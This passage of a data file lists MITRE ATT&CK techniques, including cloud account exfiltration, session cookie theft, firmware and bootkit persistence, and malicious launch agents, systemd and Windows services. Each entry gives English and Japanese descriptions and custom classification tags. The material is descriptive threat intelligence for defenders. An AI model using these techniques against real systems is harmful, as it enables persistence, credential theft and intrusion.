2018)",攻撃者は、共有/同期やクラウド環境のバックアップ作成などを通じて、データを転送することでデータを流出させる可能性があります。そのデータは、同じサービス上で攻撃者が制御する別のクラウドアカウントに転送されます。通常のファイル転送やコマンド＆コントロールチャネルを介したクラウド環境外への大規模な転送を監視している防御者は、同じクラウドプロバイダー内の別のアカウントへのデータ転送を監視していない可能性があります。 このような転送では、既存のクラウドプロバイダーAPIやプロバイダー内部のアドレス空間を利用し、通常のトラフィックに紛れ込ませたり、外部ネットワークインターフェース経由のデータ転送を回避したりする可能性がある（引用元：TLDRSec AWS Attacks）。また、匿名ファイル共有リンクの作成や、Azureにおける共有アクセス署名（SAS）URIなど、クラウドネイティブのメカニズムを利用して被害者データを攻撃者が制御するクラウドアカウントと共有する場合もある。（引用元：Microsoft Azure Storage Shared Access Signature）攻撃者がクラウドインスタンスのバックアップを作成し、別アカウントへ転送した事例が確認されている。（引用元：DOJ GRU Indictment Jul 2018）,exfiltration,IaaS;SaaS;Office Suite,script_command_execution,data_outflow,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Backup Server;File Server;Identity / SaaS (IdP/SSO);Management Console for GovCloud;My Number Administrative System on GovCloud,has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6,2019-08-30T13:03:04.038Z,2025-04-15T23:16:36.472Z,,,,
T1538,,Cloud Service Dashboard,クラウドサービスダッシュボード,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard) Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.",敵対者は、盗んだ認証情報を使用してクラウドサービスダッシュボードのGUIを利用し、運用中のクラウド環境から有用な情報（特定のサービス、リソース、機能など）を取得する可能性があります。 たとえば、GCP コマンドセンターを使用すると、すべての資産の表示、潜在的なセキュリティリスクの発見内容の確認、公開 IP アドレスや開いているポートの検索などの追加クエリの実行が可能です（引用元：Google コマンドセンターダッシュボード）。環境の構成によっては、攻撃者は API よりもグラフィカルなダッシュボードを通じてより多くの情報を列挙できる場合があります。これにより、攻撃者は API リクエストを手動で実行することなく情報を入手することも可能になります。,discovery,IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,situational_awareness,authentication_system;endpoint_execution;cloud_control_plane,specified,Identity / SaaS (IdP/SSO);Management Console for GovCloud,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--e49920b0-6c54-40c1-9571-73723653205f,2019-08-30T18:11:24.582Z,2025-04-15T19:59:16.288Z,,,,
T1539,,Steal Web Session Cookie,Webセッションクッキーの窃取,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website. Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie) There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023) There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena) After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",攻撃者は、Webアプリケーションやサービスのセッションクッキーを窃取し、認証情報なしで認証済みユーザーとしてWebアプリケーションやインターネットサービスにアクセスするために使用することがあります。Webアプリケーションやサービスは、ユーザーがWebサイトに認証した後、認証トークンとしてセッションクッキーを使用することがよくあります。クッキーは、Webアプリケーションが積極的に使用されていない場合でも、長期間有効であることがよくあります。クッキーは、ディスク上、ブラウザのプロセスメモリ内、およびリモートシステムへのネットワークトラフィック内で見つけることができます。 さらに、標的マシンの他のアプリケーション（例：クラウドサービスに認証するアプリ）が機密性の高い認証クッキーをメモリに保存している場合もある。セッションクッキーは、一部の多要素認証プロトコルを迂回するために利用される可能性がある。(引用: Pass The Cookie) ローカルシステム上のウェブブラウザからクッキーを標的とするマルウェアの事例が複数存在する。(引用: Kaspersky TajMahal 2019年4月)(引用元: Unit 42 Mac Crypto Cookies January 2019) 攻撃者は、ウェブサイトに悪意のあるJavaScriptコンテンツを注入したり、[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存して被害者を騙しブラウザで悪意のあるJavaScriptを実行させることでクッキーを窃取することもあります。(引用元: Talos Roblox Scam 2023)(引用元: Krebs Discord Bookmarks 2023) また、`Evilginx2`や`Muraena`といったオープンソースフレームワークも存在し、攻撃者が設定可能な悪意のあるプロキシ（例：[中間者攻撃](https://attack.mitre.org/techniques/T1557)）を通じてセッションクッキーを収集し、フィッシングキャンペーンに利用できます。(引用元: Github evilginx2)(引用元: GitHub Mauraena) 攻撃者が有効なクッキーを取得した後、[Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) 技術を用いて対応するウェブアプリケーションにログインすることが可能となる。,credential-access,Linux;macOS;Windows;SaaS;Office Suite,credential_abuse,credential_gain,authentication_system;mfa_in_use;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff,2019-10-08T20:04:35.508Z,2025-04-15T23:12:39.075Z,,,,
T1542,,Pre-OS Boot,OS起動前,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting) Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",攻撃者は、システムへの永続性を確立する手段として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセスでは、オペレーティングシステムが制御を引き継ぐ前に、ファームウェアや各種起動サービスがロードされます。これらのプログラムは、OSが制御を掌握する前に行動の実行フローを制御します。（出典：Wikipedia ブート）攻撃者は、BIOS（基本入出力システム）やUEFI（統一拡張ファームウェアインターフェース）などのブートドライバやファームウェア内のデータを上書きし、オペレーティングシステムの下位レイヤでシステムに永続化を図ることがあります。このレベルのマルウェアはホストソフトウェアベースの防御では検出されないため、特に検知が困難です。,defense-evasion;persistence,Linux;Network Devices;Windows;macOS,other,stealth,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e,2019-11-13T14:44:49.439Z,2025-04-15T19:58:45.876Z,,,,
T1542.001,T1542,System Firmware,システムファームウェア,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI) System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",攻撃者はシステムファームウェアを改変し、システム上に永続化を図ることがある。BIOS（基本入出力システム）や統一拡張ファームウェアインターフェース（UEFI）、拡張ファームウェアインターフェース（EFI）は、コンピュータのオペレーティングシステムとハードウェア間のソフトウェアインターフェースとして機能するシステムファームウェアの例である。(出典: Wikipedia BIOS)(出典: Wikipedia UEFI)(出典: About UEFI) BIOSや(U)EFIのようなシステムファームウェアはコンピュータの機能基盤であり、攻撃者によって改変され悪意のある活動を実行または支援する可能性があります。システムファームウェアを上書きする手法が存在し、高度な攻撃者はこれを悪意のあるファームウェア更新としてインストールし、検出が困難なシステム永続化手段とする可能性があります。,persistence;defense-evasion,Windows;Network Devices,other,stealth,,unknown,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003;TA0005,attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada,2019-12-19T19:43:34.507Z,2025-04-15T19:58:09.046Z,,,,
T1542.002,T1542,Component Firmware,コンポーネントファームウェア,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking. Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",攻撃者はコンポーネントファームウェアを改変し、システムへの永続化を図る可能性がある。 一部の攻撃者は、高度な手段を用いてコンピュータコンポーネントを侵害し、オペレーティングシステムやメインシステムファームウェア（BIOS）の外で攻撃者コードを実行する悪意のあるファームウェアをインストールする場合がある。この手法は[システムファームウェア](https://attack.mitre.org/techniques/T1542/001)と類似しているが、同等の機能や完全性チェックレベルを持たない他のシステムコンポーネント/デバイスに対して実施される可能性がある。 悪意のあるコンポーネントファームウェアは、アクセス維持やハードディスクの再イメージングにおける潜在的な一般的な障害にもかかわらず、システムへの永続的なアクセスレベルを提供するだけでなく、ホストソフトウェアベースの防御や完全性チェックを回避する手段となる可能性があります。,persistence;defense-evasion,Windows;Linux;macOS,other,stealth,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003;TA0005,attack-pattern--791481f8-e96a-41be-b089-a088763083d4,2019-12-19T20:21:21.669Z,2025-04-15T19:58:43.347Z,,,,
T1542.003,T1542,Bootkit,ブートキット,"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011) The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code. In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",攻撃者はシステムに永続化するためにブートキットを使用する可能性がある。ブートキットはハードドライブのブートセクタを改変するマルウェアの一種であり、コンピュータのオペレーティングシステムが読み込まれる前に悪意のあるコードを実行させる。ブートキットはオペレーティングシステムの下位レイヤに存在するため、組織が使用を疑い適切な対応を取らない限り、完全な修復が困難となる場合がある。 BIOSシステムでは、ブートキットがマスターブートレコード（MBR）および／またはボリュームブートレコード（VBR）を改変する可能性がある（出典：Mandiant M Trends 2016）。MBRはBIOSによるハードウェア初期化完了後に最初に読み込まれるディスク領域であり、ブートローダーが配置される場所である。 ブートドライブへの直接アクセス権を持つ攻撃者は、この領域を上書きすることで、起動時の実行を通常のブートローダーから攻撃者コードへ転送できます（出典：Lau 2011）。MBRはブートプロセスの制御をVBRに引き継ぎます。MBRの場合と同様に、ブートドライブへの直接アクセス権を持つ攻撃者はVBRを上書きし、起動時の実行を攻撃者コードへ転送できます。 UEFI（Unified Extensible Firmware Interface）システムでは、ブートキットが代わりにEFIシステムパーティション（ESP）内のファイルを作成または改変する可能性があります。ESPは、UEFIを搭載したデバイスが使用するデータストレージ上のパーティションであり、システムがOSやその他のユーティリティを起動することを可能にします。 攻撃者はESP内の新規作成または改変されたファイルを利用して、悪意のあるカーネルコードを実行できる。(引用元: Microsoft Security)(引用元: welivesecurity),persistence;defense-evasion,Linux;Windows,other,stealth,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003;TA0005,attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba,2019-12-19T21:05:38.123Z,2025-04-15T19:58:10.739Z,,,,
T1542.004,T1542,ROMMONkit,ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks) ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",攻撃者は、不正なファームウェアをロードして永続的なアクセスを提供し、検出が困難なデバイス動作を操作するために、ROMモニター（ROMMON）を悪用する可能性があります。（引用元：Cisco Synful Knock Evolution）（引用元：Cisco Blog Legacy Device Attacks）ROMMONは、プラットフォームの電源投入時またはリセット時にハードウェアとソフトウェアを初期化するブートローダー、ブートイメージ、またはブートヘルパーとして機能するCiscoネットワークデバイスのファームウェアです。 [TFTPブート](https://attack.mitre.org/techniques/T1542/005)と同様に、攻撃者はローカルまたはリモート（例：TFTP経由）でROMMONイメージを攻撃者コードでアップグレードし、デバイスを再起動して既存のROMMONイメージを上書きする可能性があります。 これにより、攻撃者は ROMMON を更新して、検出が困難な方法でシステムに永続性を獲得する手段を得ることができます。,defense-evasion;persistence,Network Devices,other,stealth,network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc,2020-10-20T00:05:48.790Z,2025-04-25T14:47:36.549Z,,,,
T1542.005,T1542,TFTP Boot,TFTP ブート,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",攻撃者は、ネットブートを悪用して、Trivial File Transfer Protocol（TFTP）サーバーから不正なネットワークデバイスオペレーティングシステムをロードする可能性があります。TFTPブート（ネットブート）は、ネットワーク管理者が集中管理サーバーから構成管理されたネットワークデバイスイメージをロードするために一般的に使用されます。ネットブートはブートシーケンスの選択肢の一つであり、デバイスイメージの集中管理、管理、制御に使用できます。 攻撃者はネットワークデバイスの設定を操作し、悪意のあるTFTPサーバーの使用を指定することがあり、これは[システムイメージの改変](https://attack.mitre.org/techniques/T1601)と組み合わせて、デバイス起動時またはリセット時に改変されたイメージをロードするために使用される可能性がある。 不正なイメージにより、攻撃者はデバイス設定を変更し、悪意のある機能を追加し、バックドアを導入してネットワークデバイスの制御を維持できます。標準機能を利用することで検知を最小限に抑えられます。この手法は[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)に類似し、ネットワークデバイスが改変されたイメージを実行する結果となる可能性があります。（引用元：Cisco Blog Legacy Device Attacks）,defense-evasion;persistence,Network Devices,config_policy_manipulation,stealth,authentication_system;privileged_account;network_connectivity;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4,2020-10-20T00:06:56.180Z,2025-04-25T14:46:08.824Z,,,,
T1543,,Create or Modify System Process,システムプロセスの作成または変更,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect. Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)",攻撃者は、持続性確保の一環として悪意のあるペイロードを繰り返し実行するため、システムレベルのプロセスを作成または変更する可能性があります。オペレーティングシステムが起動する際、バックグラウンドでシステム機能を実行するプロセスを開始できます。WindowsおよびLinuxでは、これらのシステムプロセスはサービスと呼ばれます。(引用元: TechNet Services) macOSでは、システム初期化を完了しユーザー固有のパラメータをロードするために、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)および[Launch Agent](https://attack.mitre.org/techniques/T1543/001)として知られるlaunchdプロセスが実行される。(引用元: AppleDocs Launch Agent Daemons) 攻撃者は、永続性を確立するために、起動時または繰り返し間隔で実行されるように設定可能な新しいサービス、デーモン、またはエージェントをインストールする可能性があります。同様に、攻撃者は既存のサービス、デーモン、またはエージェントを変更して同様の効果を達成する可能性があります。サービス、デーモン、またはエージェントは管理者権限で作成される場合がありますが、root/SYSTEM権限で実行されます。 攻撃者はこの機能を利用してシステムプロセスを作成または変更し、権限昇格を図ることがある。(引用元: OSX Malware Detection),persistence;privilege-escalation,Windows;macOS;Linux;Containers,other,privilege_gain,privileged_account;user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5,2020-01-10T16:03:18.865Z,2025-04-15T22:11:29.155Z,,,,
T1543.001,T1543,Launch Agent,Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks. Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command. Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)",攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、起動エージェントを作成または変更する可能性があります。 ユーザーがログインすると、ユーザーごとの launchd プロセスが開始され、<code>/System/Library/LaunchAgents</code>、<code>/Library/LaunchAgents</code>、および <code>~/Library/LaunchAgents</code> にあるプロパティリスト (.plist) ファイルから、オンデマンド起動ユーザーエージェントのパラメータが読み込まれます。(引用元: AppleDocs Launch Agent Daemons)(引用元: OSX Keydnap malware) (引用元: Antiquated Mac Malware) プロパティリストファイルは、<code>Label</code>、<code>ProgramArguments</code>、<code>RunAtLoad</code>キーを使用して、Launch Agentの名前、実行可能ファイルの場所、実行時間を識別します。(引用元: OSX.Dok Malware) ローンチエージェントは、プログラムの更新を実行したり、ログイン時にユーザー指定のプログラムを起動したり、その他の開発者タスクを実行するためにインストールされることが多い。ローンチエージェントは、[Launchctl](https://attack.mitre.org/techniques/T1569/001) コマンドを使用して実行することもできる。 攻撃者は、<code>RunAtLoad</code> または <code>KeepAlive</code> キーを <code>true</code> に設定した .plist ファイルを適切なフォルダに配置することで、ログイン時に実行される新しい起動エージェントをインストールする可能性があります。(引用: Sofacy Komplex Trojan)(引用: Methods of Mac Malware Persistence) 起動エージェント名は、関連するオペレーティングシステムや無害なソフトウェアの名前を使用して偽装される可能性があります。起動エージェントはユーザーレベルの権限で作成され、ユーザーレベルの権限で実行されます。(引用: OSX Malware Detection)(引用: OceanLotus for OS X),persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584,2020-01-17T16:10:58.592Z,2025-04-15T19:59:10.035Z,,,,
T1543.002,T1543,Systemd Service,Systemdサービス,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible. Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service) * `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start. * `ExecReload` directive executes when a service restarts. * `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped. Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) The `.service` file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. Systemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、systemd サービスを作成または変更する場合があります。 systemdは、バックグラウンドデーモンプロセス（サービスとも呼ばれる）やその他のシステムリソースを管理するために一般的に使用されるシステムおよびサービスマネージャーである。（引用元：Linux man-pages: systemd January 2014）systemdは、SysVinitやUpstartなどのレガシーinitシステムに取って代わり、多くのLinuxディストリビューションでデフォルトの初期化（init）システムとして採用されているが、下位互換性を維持している。 Systemdは、サービスのプロセスに関する情報を記述するために`.service`拡張子を持つユニット設定ファイルを利用します。デフォルトでは、システムレベルのユニットファイルはルート所有ディレクトリ（`/`）内の`/systemd/system`ディレクトリに保存されます。ユーザーレベルのユニットファイルは、ユーザー所有ディレクトリ（`$HOME`）内の`/systemd/user`ディレクトリに保存されます。(引用: lambert systemd 2022) `.service`ユニットファイル内では、以下のディレクティブがコマンド実行に使用されます:(引用: freedesktop systemd.service)* `ExecStart`、`ExecStartPre`、`ExecStartPost`ディレクティブは、`systemctl`による手動起動時、または自動起動設定時のシステム起動時に実行されます。 * `ExecReload`ディレクティブは、サービスが再起動する際に実行されます。* `ExecStop`、`ExecStopPre`、および`ExecStopPost`ディレクティブは、サービスが停止する際に実行されます。攻撃者は、新しいサービスファイルを作成し、`.service`ファイルのディレクティブが実行するコマンドを変更し、`.service`ファイルが実行するユーザーディレクティブを変更することで、権限昇格を引き起こす可能性があります。 攻撃者はこれらのディレクトリにシンボリックリンクを配置し、ファイルシステム上の位置に関係なくsystemdがこれらのペイロードを発見できるようにする可能性もあります。（引用元: Anomali Rocke 2019年3月）（引用元: airwalk backdoor unix systems）（引用元: Rapid7 Service Persistence 2016年6月22日） `.service`ファイルのUserディレクティブは、サービスを特定のユーザーとして実行するために使用でき、特定のユーザー/グループの権限に基づいて権限昇格を引き起こす可能性があります。systemdサービスは、ユニットファイルの動的生成をサポートするsystemdジェネレータを介して作成できます。 Systemdジェネレータは、起動時または設定再読み込み時に実行される小さな実行可能ファイルであり、非ネイティブ設定をサービス、シンボリックリンク、またはドロップイン（例：[起動またはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)）に変換することで、systemdユニットファイルを動的に作成または変更します。(引用元: Elastic Security Labs Linux Persistence 2024)(引用元: Pepe Berba Systemd 2022),persistence;privilege-escalation,Linux,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b,2020-01-17T16:15:19.870Z,2025-04-15T19:59:14.487Z,,,,
T1543.003,T1543,Windows Service,Windowsサービス,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden Eservices (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、Windows サービスを作成または変更する可能性があります。Windows が起動すると、バックグラウンドでシステム機能を実行する「サービス」と呼ばれるプログラムやアプリケーションが開始されます。(引用元: TechNet Services) サービスの実行ファイルや回復プログラム/コマンドへのファイルパスを含む Windows サービスの構成情報は、Windows レジストリに保存されます。 